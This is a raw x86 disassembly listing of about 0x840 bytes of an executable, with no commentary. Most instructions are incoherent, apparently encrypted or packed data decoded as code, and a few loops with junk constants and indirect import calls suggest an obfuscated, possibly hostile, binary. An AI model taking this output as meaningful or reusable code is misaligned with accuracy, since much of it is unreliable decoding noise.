  40b000:	repnz push eax
  40b002:	cmc    
  40b003:	mov    esi,0x9e756ba2
  40b008:	shl    BYTE PTR [esi],1
  40b00a:	adc    eax,0x73b9ec26
  40b00f:	cmp    ebx,DWORD PTR [ecx-0x138967d8]
  40b015:	mov    ds:0x4e314162,al
  40b01a:	cmp    edx,DWORD PTR [ebp+0x29]
  40b01d:	cmc    
  40b01e:	pop    edi
  40b01f:	cli    
  40b020:	xor    DWORD PTR [edi-0x11d2e562],ecx
  40b026:	mov    ah,0x1b
  40b028:	cmp    ch,BYTE PTR [edx+0x1d]
  40b02b:	xchg   edi,eax
  40b02c:	add    al,0x7d
  40b02e:	ja     0x40b098
  40b030:	popf   
  40b031:	inc    BYTE PTR [esi-0x20]
  40b034:	xor    bl,bl
  40b036:	(bad)  
  40b037:	std    
  40b038:	mov    esp,edx
  40b03a:	int3   
  40b03b:	xor    BYTE PTR [edx+eiz*2+0x47],ch
  40b03f:	jns    0x40b009
  40b041:	or     cl,BYTE PTR [eax]
  40b043:	mov    ecx,0x25797d43
  40b048:	ret    0xa02c
  40b04b:	mov    esp,0x5a05f594
  40b050:	pop    ecx
  40b051:	sti    
  40b052:	sbb    BYTE PTR [edx-0x6e],cl
  40b055:	jno    0x40b057
  40b057:	push   edi
  40b058:	ror    esp,0x12
  40b05b:	fisttp DWORD PTR [esi+0x73]
  40b05e:	jp     0x40b04e
  40b060:	cld    
  40b061:	or     ecx,DWORD PTR [ecx-0x80]
  40b064:	inc    esp
  40b065:	xor    DWORD PTR [ebp-0x4cec50d6],edx
  40b06b:	ret    0xe348
  40b06e:	test   BYTE PTR [ebp+eax*4+0x6a],ah
  40b072:	mov    ah,0x7e
  40b074:	ins    DWORD PTR es:[edi],dx
  40b075:	fisub  DWORD PTR [edx+0x2a]
  40b078:	bound  esp,QWORD PTR [edi]
  40b07a:	pop    esi
  40b07b:	pop    ds
  40b07c:	sub    eax,0x914194bb
  40b081:	rcr    BYTE PTR [ebx+0x5b],1
  40b084:	out    0x64,al
  40b086:	outs   dx,BYTE PTR ds:[esi]
  40b087:	loopne 0x40b0d7
  40b089:	mov    eax,0x6d2c2cca
  40b08e:	cs ja  0x40b091
  40b091:	push   ds
  40b092:	xchg   BYTE PTR [ebx+esi*4+0x3ee4567e],dh
  40b099:	xchg   edi,eax
  40b09a:	sub    dl,BYTE PTR [ecx+0x33]
  40b09d:	ret    0xf233
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    ah,dl
  40b0da:	push   esi
  40b0db:	cdq    
  40b0dc:	out    0x9d,eax
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b086
  40b0e6:	or     bh,dl
  40b0e8:	adc    dh,BYTE PTR [edx-0x70e0afd7]
  40b0ee:	scas   eax,DWORD PTR es:[edi]
  40b0ef:	iret   
  40b0f0:	add    bl,dh
  40b0f2:	push   cs
  40b0f3:	shr    ah,0xfc
  40b0f6:	jo     0x40b163
  40b0f8:	or     al,0x59
  40b0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0fb:	adc    BYTE PTR [edx],al
  40b0fd:	mov    DWORD PTR [edx],edx
  40b0ff:	in     eax,0xae
  40b101:	mov    bh,0x47
  40b103:	ret    
  40b104:	jne    0x40b0c4
  40b106:	and    DWORD PTR [esp+eiz*8+0x41],0x7c5ae215
  40b10e:	js     0x40b0fe
  40b110:	daa    
  40b111:	mov    bl,0xee
  40b113:	jnp    0x40b151
  40b115:	mov    al,ds:0xb1b0e3c2
  40b11a:	nop
  40b11b:	xor    ecx,ebx
  40b11d:	mov    al,ds:0xb6af2bbe
  40b122:	lods   eax,DWORD PTR ds:[esi]
  40b123:	lods   al,BYTE PTR ds:[esi]
  40b124:	adc    al,0x2a
  40b126:	mov    ds:0xa13c24e7,al
  40b12b:	fadd   DWORD PTR [edx+0x412a1111]
  40b131:	dec    esi
  40b132:	dec    esi
  40b133:	mov    cl,0x30
  40b135:	fdivr  QWORD PTR [edx-0xe833e2c]
  40b13b:	loop   0x40b0df
  40b13d:	inc    esi
  40b13e:	pop    edx
  40b13f:	push   ebp
  40b140:	cmp    al,0x81
  40b142:	test   BYTE PTR [ebp+eiz*8+0x6f4b91d1],cl
  40b149:	jbe    0x40b0e2
  40b14b:	popa   
  40b14c:	mov    ah,0x8a
  40b14e:	push   eax
  40b14f:	dec    ebx
  40b150:	push   ds
  40b151:	das    
  40b152:	mov    ds:0xc1821881,al
  40b157:	adc    BYTE PTR [esp+ecx*4+0x34],ah
  40b15b:	(bad)  
  40b15c:	aam    0x9
  40b15e:	dec    ebx
  40b15f:	mov    eax,0xed37659
  40b164:	jp     0x40b1e3
  40b166:	push   eax
  40b167:	out    dx,eax
  40b168:	and    DWORD PTR [ebx],ebp
  40b16a:	pop    esp
  40b16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16c:	push   eax
  40b16d:	xlat   BYTE PTR ds:[ebx]
  40b16e:	sub    BYTE PTR [edx-0x1b772c6f],ah
  40b174:	imul   eax,DWORD PTR [edx-0x533ca90a],0xf8601f7
  40b17e:	xchg   eax,edi
  40b180:	sub    eax,0x617667b3
  40b185:	mov    DWORD PTR [eax-0x6688b929],esp
  40b18b:	clc    
  40b18c:	dec    edx
  40b18d:	popf   
  40b18e:	cmp    al,0x70
  40b190:	scas   eax,DWORD PTR es:[edi]
  40b191:	sahf   
  40b192:	jecxz  0x40b200
  40b194:	repnz shl BYTE PTR [ecx+0x10],0xd7
  40b199:	ficom  DWORD PTR [ebp+ecx*2-0x45]
  40b19d:	mov    ecx,0xca78b446
  40b1a2:	sub    al,0xa3
  40b1a4:	xchg   edx,eax
  40b1a5:	nop
  40b1a6:	add    BYTE PTR [ebx],al
  40b1a8:	jmp    0x12f9:0x5f46669c
  40b1af:	and    bl,BYTE PTR [eax-0x1c]
  40b1b2:	pusha  
  40b1b3:	add    eax,DWORD PTR [ecx-0x518bd389]
  40b1b9:	test   BYTE PTR [esi+0x22789066],ah
  40b1bf:	lea    ecx,[ecx]
  40b1c1:	dec    edi
  40b1c2:	push   ebx
  40b1c3:	outs   dx,BYTE PTR ds:[esi]
  40b1c4:	into   
  40b1c5:	fild   DWORD PTR [edx+0x6f75e0dc]
  40b1cb:	aas    
  40b1cc:	in     al,0x91
  40b1ce:	mov    bh,0x60
  40b1d0:	mov    ebp,0x36a4c96d
  40b1d5:	sar    DWORD PTR [edx],0x21
  40b1d8:	cwde   
  40b1d9:	loopne 0x40b24e
  40b1db:	push   edi
  40b1dc:	leave  
  40b1dd:	sub    eax,DWORD PTR ds:[esi+0x5]
  40b1e1:	icebp  
  40b1e2:	in     al,dx
  40b1e3:	nop
  40b1e4:	pop    ss
  40b1e5:	mov    ds:0x3a614e8c,al
  40b1ea:	lods   al,BYTE PTR ds:[esi]
  40b1eb:	aad    0x3d
  40b1ed:	jmp    0xbeb07cc
  40b1f2:	sbb    cl,cl
  40b1f4:	push   ds
  40b1f5:	mov    ds:0xe7d0fa34,al
  40b1fa:	pusha  
  40b1fb:	xlat   BYTE PTR ds:[ebx]
  40b1fc:	cmp    edx,esi
  40b1fe:	sub    eax,DWORD PTR [ecx+0x76]
  40b201:	push   esi
  40b202:	rep outs dx,DWORD PTR ds:[esi]
  40b204:	and    BYTE PTR [edi+esi*2],0xa9
  40b208:	jg     0x40b1a7
  40b20a:	sbb    ecx,DWORD PTR ds:[esi+0x80eb511]
  40b211:	fiadd  WORD PTR [eax]
  40b213:	call   0xf8e2:0x9e4caee3
  40b21a:	shl    DWORD PTR [edi+0x7c575364],1
  40b220:	(bad)  
  40b221:	cdq    
  40b222:	push   ebx
  40b223:	adc    bh,BYTE PTR [eax-0x64]
  40b226:	xchg   al,ah
  40b228:	sub    al,0x60
  40b22a:	and    al,0x65
  40b22c:	in     eax,0x15
  40b22e:	cmp    edi,ecx
  40b230:	jl     0x40b212
  40b232:	push   0xf
  40b234:	ss or  al,0x2d
  40b237:	aas    
  40b238:	fcomp  QWORD PTR ds:0x37247cbb
  40b23e:	push   esp
  40b23f:	cmp    eax,0x1806bec9
  40b244:	je     0x40b243
  40b246:	shr    DWORD PTR [ebx-0x74dc0ea2],0xab
  40b24d:	in     eax,dx
  40b24e:	pop    ebp
  40b24f:	cmp    DWORD PTR [ecx],ecx
  40b251:	or     eax,DWORD PTR [ebx]
  40b253:	sub    DWORD PTR [ebx+eax*4],ebp
  40b256:	jecxz  0x40b1eb
  40b258:	imul   ebx,DWORD PTR [ecx+0x67f024df],0xffffffc9
  40b25f:	mov    eax,esp
  40b261:	or     eax,0xfb6fad7f
  40b266:	or     esp,ebp
  40b268:	mov    eax,0x6639e34d
  40b26d:	in     al,0x6b
  40b26f:	test   al,0x51
  40b271:	rol    dl,cl
  40b273:	xchg   ch,ch
  40b275:	add    ah,BYTE PTR [ecx-0x7e4f2134]
  40b27b:	fisttp DWORD PTR [esi]
  40b27d:	popa   
  40b27e:	or     dh,BYTE PTR [ecx+edi*4-0x51]
  40b282:	jmp    0x2b8c:0x9cbc3c34
  40b289:	retf   
  40b28a:	shrd   DWORD PTR [ebx-0x59dcebc5],edi,cl
  40b291:	add    ebx,DWORD PTR [edx]
  40b293:	inc    esi
  40b294:	cmc    
  40b295:	push   edi
  40b296:	add    BYTE PTR [ebx-0x71],dh
  40b299:	bnd jmp 0x336a0ca8
  40b29f:	sbb    dh,BYTE PTR [esi-0x2d1dd3f1]
  40b2a5:	jl     0x40b2be
  40b2a7:	int    0x1
  40b2a9:	cld    
  40b2aa:	fst    st(1)
  40b2ac:	dec    esi
  40b2ad:	repnz push esp
  40b2af:	in     eax,0x33
  40b2b1:	adc    eax,0xd291732d
  40b2b6:	loope  0x40b291
  40b2b8:	add    BYTE PTR [eax],ah
  40b2ba:	jns    0x40b2e3
  40b2bc:	xchg   esi,eax
  40b2bd:	jbe    0x40b29f
  40b2bf:	fcmovne st,st(4)
  40b2c1:	pop    eax
  40b2c2:	daa    
  40b2c3:	pop    esi
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43056e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43057a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	stos   DWORD PTR es:[edi],eax
  40b2f1:	push   esp
  40b2f2:	das    
  40b2f3:	inc    ebp
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b288
  40b2fd:	aaa    
  40b2fe:	test   edi,eax
  40b300:	xchg   esp,eax
  40b301:	inc    esi
  40b302:	(bad)  
  40b303:	jmp    0x40b297
  40b305:	call   0x518c456c
  40b30a:	clc    
  40b30b:	jns    0x40b30d
  40b30d:	int3   
  40b30e:	jns    0x40b336
  40b310:	(bad)  
  40b311:	mov    edi,0x9b6f4b7a
  40b316:	ret    0xe841
  40b319:	and    DWORD PTR [ecx-0x3089060d],edx
  40b31f:	or     BYTE PTR [ecx+0x3a],0xef
  40b323:	mov    edi,0x9c338d0
  40b328:	ds add eax,0x6c167bef
  40b32e:	sar    BYTE PTR [ebp-0x24],0xdc
  40b332:	and    ebp,DWORD PTR [edx]
  40b334:	and    ebp,esi
  40b336:	loop   0x40b383
  40b338:	push   edi
  40b339:	mov    edi,DWORD PTR [ebp-0x51]
  40b33c:	inc    esp
  40b33d:	lods   al,BYTE PTR ds:[esi]
  40b33e:	push   ds
  40b33f:	and    eax,0xf2b2a937
  40b344:	xlat   BYTE PTR ds:[ebx]
  40b345:	pop    edx
  40b346:	sti    
  40b347:	xor    ebp,DWORD PTR [ebp+0x38]
  40b34a:	iret   
  40b34b:	mov    al,0xeb
  40b34d:	mov    DWORD PTR [ebp-0x79],esp
  40b350:	pop    edx
  40b351:	mov    DWORD PTR [eax+0x6d],edi
  40b354:	cmp    DWORD PTR [esi],esp
  40b356:	mov    DWORD PTR [ebx+0x2e],ecx
  40b359:	mov    cl,BYTE PTR [esi-0x7d6c8424]
  40b35f:	mov    eax,0x8faae5b6
  40b364:	jnp    0x40b3dd
  40b366:	int    0x34
  40b368:	repz leave 
  40b36a:	mov    cl,0xf9
  40b36c:	adc    eax,0x3290628
  40b371:	jmp    0x4698:0x6c92922e
  40b378:	inc    edi
  40b379:	sbb    DWORD PTR [ebp+0x5],esp
  40b37c:	lahf   
  40b37d:	mov    dh,0x8b
  40b37f:	or     DWORD PTR [ebp-0x5b67c3ee],0xac305c87
  40b389:	push   edi
  40b38a:	in     al,0x36
  40b38c:	test   eax,0x876a9658
  40b391:	sbb    edi,DWORD PTR [ebx-0x67]
  40b394:	sbb    ebx,DWORD PTR [esi+0x1396d5b6]
  40b39a:	mov    ?,ebp
  40b39c:	jns    0x40b3ea
  40b39e:	xor    bh,BYTE PTR [edx]
  40b3a0:	mov    DWORD PTR [ebx+eax*8+0x6016cbed],eax
  40b3a7:	push   eax
  40b3a8:	pop    edx
  40b3a9:	out    dx,al
  40b3aa:	adc    al,0x9b
  40b3ac:	xchg   edi,eax
  40b3ad:	dec    edx
  40b3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3af:	fs aaa 
  40b3b1:	xchg   ebx,eax
  40b3b2:	push   cs
  40b3b3:	mov    esp,0xa98f9cc6
  40b3b8:	dec    eax
  40b3b9:	dec    esi
  40b3ba:	mov    ah,0x4
  40b3bc:	pop    ebp
  40b3bd:	jae    0x40b3a2
  40b3bf:	xor    al,0x8
  40b3c1:	push   edx
  40b3c2:	adc    BYTE PTR [edx+0x581f4ac8],ah
  40b3c8:	dec    edi
  40b3c9:	jbe    0x40b363
  40b3cb:	pop    ebx
  40b3cc:	(bad)  
  40b3cd:	cmp    al,0x58
  40b3cf:	es pop edi
  40b3d1:	loopne 0x40b383
  40b3d3:	mov    ds:0xc465989b,al
  40b3d8:	and    al,0x8b
  40b3da:	xchg   ebp,eax
  40b3db:	loopne 0x40b36b
  40b3dd:	jns    0x40b3ef
  40b3df:	jnp    0x40b41c
  40b3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3e2:	and    bh,dh
  40b3e4:	cmp    DWORD PTR [edi],0xffffff81
  40b3e7:	jb     0x40b3e7
  40b3e9:	pop    edi
  40b3ea:	icebp  
  40b3eb:	retf   0x6ddb
  40b3ee:	cmp    dh,BYTE PTR [eax]
  40b3f0:	xchg   edx,eax
  40b3f1:	arpl   WORD PTR [edx],si
  40b3f3:	mov    ecx,0xcd6a26bb
  40b3f8:	xchg   ecx,eax
  40b3f9:	loop   0x40b472
  40b3fb:	ret    0xc54
  40b3fe:	push   eax
  40b3ff:	retf   0x4889
  40b402:	cli    
  40b403:	pushf  
  40b404:	sahf   
  40b405:	push   ebp
  40b406:	cwde   
  40b407:	pop    esi
  40b408:	mov    bh,0xfa
  40b40a:	imul   ebx,DWORD PTR [edx-0x46245911],0xffffffda
  40b411:	inc    ecx
  40b412:	pop    ecx
  40b413:	scas   al,BYTE PTR es:[edi]
  40b414:	ret    0x5de8
  40b417:	jb     0x40b3f2
  40b419:	jb     0x40b48a
  40b41b:	pop    esp
  40b41c:	test   BYTE PTR [ebx],ch
  40b41e:	inc    edi
  40b41f:	dec    edi
  40b420:	cmp    al,0x52
  40b422:	hlt    
  40b423:	push   esp
  40b424:	jmp    0x40b431
  40b426:	out    dx,al
  40b427:	jg     0x40b42d
  40b429:	out    dx,al
  40b42a:	jmp    0x287a:0xb7d4635
  40b431:	jae    0x40b49b
  40b433:	std    
  40b434:	test   DWORD PTR [eax],ebp
  40b436:	pop    edx
  40b437:	push   es
  40b438:	int3   
  40b439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b43a:	pop    ebx
  40b43b:	into   
  40b43c:	pop    esp
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x43054e,0x11
  40b44e:	cmp    DWORD PTR ds:0x43054e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43054e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eae8
  40b479:	mov    eax,ds:0x43054e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43054e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4304ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430542
  40b4aa:	sbb    DWORD PTR ds:0x42e762,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee14
  40b4b8:	sub    DWORD PTR ds:0x43048e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430546,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430496,0x42e76a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e762,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430546,0x430492
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e75e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4304a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4304a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4304a6,edi
  40b536:	cmp    DWORD PTR ds:0x4304a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4304a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eaec
  40b560:	cmp    DWORD PTR ds:0x4304a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4304a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4304a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430492
  40b591:	xor    DWORD PTR ds:0x4304ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4304be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430486
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43053e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43053e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43053e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43053e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eaf0
  40b5f7:	cmp    DWORD PTR ds:0x43053e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43053e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43053e,edi
  40b613:	cmp    DWORD PTR ds:0x43053e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0xcbb84dc4
  40b63f:	xor    al,0x29
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b64c
  40b64a:	pop    ecx
  40b64b:	int3   
  40b64c:	mov    bh,0x2e
  40b64e:	cmc    
  40b64f:	mov    ecx,ecx
  40b651:	xor    DWORD PTR [eax],ebp
  40b653:	pop    edx
  40b654:	xlat   BYTE PTR ds:[ebx]
  40b655:	scas   eax,DWORD PTR es:[edi]
  40b656:	stos   BYTE PTR es:[edi],al
  40b657:	pop    ebp
  40b658:	jno    0x40b5de
  40b65a:	sub    DWORD PTR [esi+0x69],edi
  40b65d:	mov    BYTE PTR [ecx],al
  40b65f:	popa   
  40b660:	fst    DWORD PTR [ecx-0x5d9c18b8]
  40b666:	mov    ebx,DWORD PTR ds:0x127f203f
  40b66c:	sbb    DWORD PTR [edi],esp
  40b66e:	fcomp  DWORD PTR [edx+0xa]
  40b671:	adc    al,0xa4
  40b673:	and    dl,dl
  40b675:	push   edx
  40b676:	clc    
  40b677:	sbb    al,0x50
  40b679:	xchg   ecx,eax
  40b67a:	xchg   esi,eax
  40b67b:	xlat   BYTE PTR ds:[ebx]
  40b67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b67d:	fdivr  QWORD PTR [esi-0x51b351b4]
  40b683:	cli    
  40b684:	clc    
  40b685:	inc    ebx
  40b686:	(bad)  
  40b688:	adc    cl,BYTE PTR [ebx-0x1acb4a05]
  40b68e:	pop    edx
  40b68f:	push   0xf
  40b691:	push   cs
  40b692:	mov    edi,0x8686c7b0
  40b697:	das    
  40b698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b699:	loop   0x40b6d6
  40b69b:	rcl    dh,0x69
  40b69e:	out    dx,eax
  40b69f:	push   0x6b
  40b6a1:	pop    ss
  40b6a2:	mov    dh,0xa8
  40b6a4:	cmp    eax,0xefe8418a
  40b6a9:	xchg   dh,dl
  40b6ab:	dec    ecx
  40b6ac:	in     eax,0x1b
  40b6ae:	gs aaa 
  40b6b0:	sub    BYTE PTR [eax+0x3ab60fd7],dh
  40b6b6:	mov    ah,0xd6
  40b6b8:	xchg   edx,eax
  40b6b9:	rcr    BYTE PTR [esp+edx*2-0x82a8f24],cl
  40b6c0:	in     al,dx
  40b6c1:	mov    esp,0x901fb3ae
  40b6c6:	scas   al,BYTE PTR es:[edi]
  40b6c7:	gs mov esi,es
  40b6ca:	jmp    0xa0f8eb41
  40b6cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d0:	repz sbb BYTE PTR [eax],ah
  40b6d3:	xchg   edi,eax
  40b6d4:	push   ss
  40b6d5:	pop    esp
  40b6d6:	mov    BYTE PTR cs:[esi+0x21a3d42a],al
  40b6dd:	pop    DWORD PTR [edi-0x36624f02]
  40b6e3:	shr    DWORD PTR [edx-0x4b86726],cl
  40b6e9:	push   esi
  40b6ea:	add    BYTE PTR [eax-0x61],dh
  40b6ed:	stos   DWORD PTR es:[edi],eax
  40b6ee:	data16 fld QWORD PTR [ebx]
  40b6f1:	jge    0x40b6fd
  40b6f3:	loopne 0x40b758
  40b6f5:	rcr    DWORD PTR [ebx+0x5ea9a5eb],0x9e
  40b6fc:	daa    
  40b6fd:	and    DWORD PTR [ebp+0x41],edi
  40b700:	sbb    eax,0x383b8d94
  40b705:	sub    esi,DWORD PTR [edi+0x4c351478]
  40b70b:	push   esi
  40b70c:	sar    BYTE PTR [ecx+0x204f9aa3],0xcb
  40b713:	sub    eax,DWORD PTR [eax+0x72]
  40b716:	add    eax,0xd598a96e
  40b71b:	out    0x71,al
  40b71d:	or     DWORD PTR [edx+0x6fcbd205],edi
  40b723:	pop    ebp
  40b724:	sbb    al,0x72
  40b726:	xor    DWORD PTR ds:0x748ff83f,ebx
  40b72c:	mov    cl,0xe2
  40b72e:	cmp    DWORD PTR [eax-0x360000a6],ecx
  40b734:	and    eax,0x6c132a14
  40b739:	cmp    al,0xab
  40b73b:	pop    edi
  40b73c:	(bad)  
  40b73d:	jno    0x40b7a0
  40b73f:	dec    eax
  40b740:	mov    edi,0x3758f4b7
  40b745:	push   es
  40b746:	clc    
  40b747:	aaa    
  40b748:	jo     0x40b717
  40b74a:	lea    esp,[edi-0x3ae983c]
  40b750:	fsubr  QWORD PTR [ecx+0x1d]
  40b753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b754:	cmp    DWORD PTR [esi-0x29a6d3d],0x53
  40b75b:	jge    0x40b6e6
  40b75d:	inc    eax
  40b75e:	fisubr DWORD PTR [ebp-0x36]
  40b761:	sbb    eax,0x99bde876
  40b766:	loope  0x40b780
  40b768:	push   ss
  40b769:	jae    0x40b7c3
  40b76b:	add    BYTE PTR [edx+esi*1],cl
  40b76e:	adc    dh,0x57
  40b771:	or     eax,0x3ac90117
  40b776:	push   edx
  40b777:	das    
  40b778:	adc    DWORD PTR [eax+0x1035a429],ebp
  40b77e:	outs   dx,DWORD PTR ds:[esi]
  40b77f:	xchg   BYTE PTR [eax+0x382b9d4a],ah
  40b785:	pushf  
  40b786:	hlt    
  40b787:	scas   al,BYTE PTR es:[edi]
  40b788:	jg     0x40b7a1
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x4304b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430542
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xd92ccf97
  40b7b0:	mov    eax,0x7e7ee67d
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b74d
  40b7ba:	out    0x51,eax
  40b7bc:	and    al,0x41
  40b7be:	xchg   ecx,eax
  40b7bf:	in     al,dx
  40b7c0:	pop    esp
  40b7c1:	adc    DWORD PTR [ebp-0x59cc59da],ebp
  40b7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c8:	push   es
  40b7c9:	jae    0x40b81b
  40b7cb:	scas   al,BYTE PTR es:[edi]
  40b7cc:	mov    ds:0x7b89d3dd,al
  40b7d1:	add    ecx,ebp
  40b7d3:	adc    eax,0xcb7e2ce0
  40b7d8:	retf   0x63e6
  40b7db:	rcl    esi,1
  40b7dd:	mov    ecx,?
  40b7df:	sub    bl,BYTE PTR [ecx+ecx*8]
  40b7e2:	outs   dx,BYTE PTR ds:[esi]
  40b7e3:	add    eax,0x1fd79617
  40b7e8:	fidivr WORD PTR [ebx-0x67258ea0]
  40b7ee:	popa   
  40b7ef:	stc    
  40b7f0:	pop    ecx
  40b7f1:	js     0x40b80a
  40b7f3:	int3   
  40b7f4:	pop    ss
  40b7f5:	mov    ecx,0x61107292
  40b7fa:	je     0x40b780
  40b7fc:	adc    eax,0xf7d0c807
  40b801:	jp     0x40b7d6
  40b803:	call   0x9206:0xeff9c697
  40b80a:	adc    cl,dh
  40b80c:	pop    ebx
  40b80d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b80e:	(bad)  
  40b80f:	xor    BYTE PTR [eax-0x12],0xef
  40b813:	mov    esi,?
  40b815:	pop    edx
  40b816:	jbe    0x40b821
  40b818:	and    cl,BYTE PTR [esi-0x29]
  40b81b:	les    ebx,FWORD PTR [ecx]
  40b81d:	push   ss
  40b81e:	or     BYTE PTR [ebx+eiz*1],0x69
  40b822:	pop    ebp
  40b823:	or     eax,0xcf2ca412
  40b828:	dec    eax
  40b829:	gs hlt 
  40b82b:	adc    ebx,DWORD PTR [ebp-0x6d]
  40b82e:	test   edx,ecx
  40b830:	(bad)  
  40b831:	xor    dl,BYTE PTR [edx+0x49329e3]
  40b837:	inc    eax
  40b838:	ins    DWORD PTR es:[edi],dx
  40b839:	dec    esi
  40b83a:	cwde   
  40b83b:	data16 cli 
  40b83d:	or     dl,dh
